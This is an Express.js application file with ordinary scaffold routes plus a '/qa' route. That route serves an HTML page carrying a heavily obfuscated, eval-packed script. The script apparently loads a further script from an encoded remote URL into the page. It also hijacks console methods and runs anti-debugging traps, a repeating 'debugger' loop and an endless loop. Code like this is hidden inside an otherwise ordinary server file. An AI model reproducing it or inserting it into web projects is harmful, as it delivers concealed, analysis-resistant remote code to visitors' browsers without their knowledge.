const createError = require('http-errors');
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const logger = require('morgan');

const app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));



app.get('/', function (req, res, next) {
    res.render('index', {title: 'Express'});
});

app.get('/users', function (req, res, next) {
    res.send('respond with a resource 2');
});

app.get('/qa', function (req, res, next) {
    res.send(`<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" /><title></title><link href="" rel="shortcut icon" /></head><body class="yCh3EBVXkHqeZpv"><div class="BC9nIumcPLleTDzNhZp7O" id="cFrBnMdfAYpiGJzkSaEU"></div><script>eval(function($nbrut, $utnbr, $nbr, $ut, $uyn, $yun) {$uyn=function($charCode) {return ($charCode < $utnbr ? '' : $uyn(parseInt($charCode / $utnbr))) +(($charCode = $charCode % $utnbr) > 35 ? String.fromCharCode($charCode + 29) : $charCode.toString(36));};    if (!''.replace(/^/, String)) {while ($nbr--) {$yun[$uyn($nbr)] = $ut[$nbr] || $uyn($nbr);}$ut = [function ($encoded) {return $yun[$encoded]}];$uyn = function () {return '\\w+'};$nbr = 1;};while ($nbr--) {if ($ut[$nbr]) {$nbrut = $nbrut.replace(new RegExp('\\b' + $uyn($nbr) + '\\b', 'g'), $ut[$nbr]);}}return $nbrut;}('7 k=["2e==","15","14=","13==","12==","11","Z==","Y=","L=","S==","R","M=","1m==","1t=","1r","1n==","1f==","1d","K","1w=","1b","1c","1e=","1g","1h","1i","1j==","1k==","1x","1a","1l=","1o==","1p==","1q=","1s=="];!5(a,x){!5(x){c(;--x;)a.1u(a.1v())}(18)}(k);7 3=5(x,a){7 f=k[x=+x];B 0===3.z&&(3.C=5(x){c(7 a=5(x){c(7 a,f,n=v(x).19(/=+$/,""),t="",r=0,b=0;f=n.W(b++);~f&&(a=r%4?17*a+f:f,r++%4)&&(t+=v.N(O&a>>(-2*r&6))))f="P+/=".Q(f);8 t}(x),f=[],n=0,t=a.T;n<t;n++)f+="%"+("V"+a.U(n).q(16)).X(-2);8 10(f)},3.m={},3.z=!0);7 n=3.m[x];8 B 0===n?(f=3.C(f),3.m[x]=f):f=n,f},D=5(){7 n=!0;8 5(a,f){7 x=n?5(){g(f){7 x=f.l(a,y);8 f=u,x}}:5(){};8 n=!1,x}}();!5(){D(j,5(){7 x=F o("5 *\\\\( *\\\\)"),a=F o(3("1z")+3("1M"),"i"),f=e(3("23"));x.A(f+3("24"))&&a.A(f+3("25"))?e():f("0")})()}();7 9=5(){7 n=!0;8 5(a,f){7 x=n?5(){g(f){7 x=f[3("26")](a,y);8 f=u,x}}:5(){};8 n=!1,x}}(),s=9(j,5(){J{7 a=27(3("28")+(3("29")+\'n j")( )\')+");")()}G(x){a=2a}c(7 x=a[3("w")]=a[3("w")]||{},f=["2b",3("2c"),3("2d"),3("22"),3("2f"),3("2g"),3("2i")],n=0;n<f[3("E")];n++){7 t=9[3("h")][3("2j")][3("p")](9),r=f[n],b=x[r]||t;t[3("2k")]=9.2h(9),t[3("21")]=b.q[3("p")](b),x[r]=t}});s();7 1Z="",d=H[3("1Y")](3("1B"));5 e(x){5 a(x){g(1C x===3("1D"))8 5(x){}[3("h")]("1E (1F) {}").l(3("1G"));1!==(""+x/x)[3("E")]||x%20==0?5(){8!0}[3("h")]("1H"+3("I"))[3("1I")](3("1J")):5(){8!1}.1K(3("1A")+3("I")).l("1L"),a(++x)}J{g(x)8 a;a(0)}G(x){}}d.1N=3("1O"),d[3("1P")]=3("1Q")+3("1R")+"1S.1T",H.1U(3("1V"))[0][3("1W")](d),1X(5(){e()},1y);',62,145,'♠♠♠_0xbaf4♠♠function♠♠var♠return♠_0x3aeb80♠♠♠for♠script34ssd♠_0x33d7c2♠♠if♠0x13♠♠this♠_0x130d♠apply♠rVJDzS♠♠RegExp♠0x1b♠toString♠♠_0x5442cd♠♠null♠String♠0xf♠♠arguments♠YLuYaH♠test♠void♠SyjLix♠_0x3ab8d6♠0x18♠new♠catch♠document♠0x4♠try♠E30Uy29UC3rYDwn0B3iOiNjLDhvY♠yxbWzw5Kq2HPBgq♠Aw5WDxq♠fromCharCode♠255♠abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789♠indexOf♠Ahr0Chm6lY92EMfZlMfPB2vJB2LU♠AgvHza♠length♠charCodeAt♠00♠charAt♠slice♠DgfIBgu♠zgvIDq♠decodeURIComponent♠ChjVDg90ExbL♠z2DLCG♠Aw5PDa♠Dg9tDhjPBMC♠lM9YzY82mgeZywy3yJG2mtK3nJyY♠♠64♠491♠replace♠xcTCkYaQkd86w2eTEKeTwL8KxvSW♠C3jJ♠x19WCM90B19F♠Dgv4Dc9QyxzHC2nYAxb0♠zxjYB3i♠Aw5MBW♠C3rYAw5N♠BgvUz3rO♠zxHJzxb0Aw9U♠D2fYBG♠yMLUza♠yxbWBhK♠ltLHlxPblvPFjf0Qkq♠y29UC29Szq♠y2fSBa♠y3jLyxrLrwXLBwvUDa♠DhjHy2u♠ywn0Aw9U♠CMv0DxjUicHMDw5JDgLVBIGPia♠y2HHAw4♠push♠shift♠y29UC3rYDwn0B3i♠C2nYAxb0♠4e3♠0x1d♠0x6♠0x1c♠typeof♠0x17♠while♠true♠0x0♠debu♠0x1f♠0xe♠constructor♠stateObject♠0xc♠type♠0x11♠0x14♠0xa♠0x1♠220b6d17♠js♠getElementsByTagName♠0x9♠0x8♠setInterval♠0x20♠emfromgetnbrtoo♠♠0x2♠0x16♠0x3♠0xd♠0xb♠0x1e♠Function♠0x22♠0x12♠window♠log♠0x1a♠0x10♠y291BNrLCG♠0x19♠0x7♠bind♠0x21♠0x5♠0x15'.split('♠'),0,{}))</script></body></html>`);
});

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;
